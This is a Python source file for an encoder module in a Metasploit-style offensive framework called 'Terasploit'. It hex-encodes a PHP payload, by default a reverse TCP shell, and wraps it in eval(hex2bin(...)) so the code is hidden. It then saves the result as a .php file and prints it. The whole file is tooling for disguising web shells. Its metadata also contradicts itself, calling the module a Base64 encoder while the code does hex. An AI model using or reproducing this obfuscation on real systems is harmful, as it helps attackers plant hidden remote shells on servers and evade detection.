#######
# Module/Encoder: PHP Hex Encoder
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.encoder import *

class TerasploitModule(Encoder):

    def initialize(self,info_only: bool = False) -> None:
        update_info(
            {
                'License'     : 'Terasploit Framework License (BSD)',
                'Name'        : 'PHP Base64 Encoder',
                'Module'      : Module.encoder,
                'Arch'        : Arch.PHP,
                'Platform'    : Platform.PHP,
                'Payload'     : 'modules/payload/php/shell_reverse_tcp',
                'Author'      : [
                    'Charlie <rupture6.dev[at]gmail.com>'
                ],
                'Description' : [
                    'PHP Base64 Encoder'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('encoder',reset=True)


    def encode(self,payload,arch):
        if arch.lower() != Arch.PHP:
            print_info ('Failed to encode, invalid encoder.')
            return False

        encode = str(hexlify(bytes(payload, "utf-8")), "utf-8")

        return (
            "eval(hex2bin('{}'));".format(
                encode
            )
        ), True


    def run(self) -> tuple[str, bool]: 
        payload = Get.payload()[0].generate()
        payload_arch = module_info.payload_info['Arch']
        shell_name = module_info.payload_info['PayloadHandler']

        print_info ('Encoding shell...')
        encoded_shell = self.encode(payload,payload_arch)
        if not encoded_shell:
            return 'done', True
        
        print_info ('Done encoding shell in hex, generating file...')
        shell, boolean = encoded_shell
        if boolean == True:
            self.generate_file(shell_name,payload_arch,shell)
            print_info (f'Saved as {shell_name}.php')
            for i in ['----',shell,'----']:
                print (i)
            return 'done', True
        if boolean == False:
            return 'done', True